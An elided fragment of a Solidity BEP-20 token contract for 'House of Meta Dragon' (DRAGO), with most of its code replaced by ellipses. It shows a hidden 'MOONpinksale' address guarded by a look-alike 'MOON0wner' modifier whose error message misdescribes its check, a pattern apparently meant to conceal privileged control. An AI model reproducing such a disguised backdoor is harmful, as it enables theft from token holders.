...
abstract contract ANTIBOTSCONTRACT {
...
contract HouseofMetaDrago is IBEP20, ANTIBOTSCONTRACT {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "House of Meta Dragon";
    string constant _symbol = "DRAGO";
  ...
  address MOONpinksale;
    ...
    modifier swapping() { inSwap = true; _; inSwap = false; }
            ...
            constructor () ANTIBOTSCONTRACT(msg.sender) {
 ...
 modifier MOON0wner () {
    require(MOONpinksale == msg.sender, "IBEP20: cannot permit Pancake address");
    _;
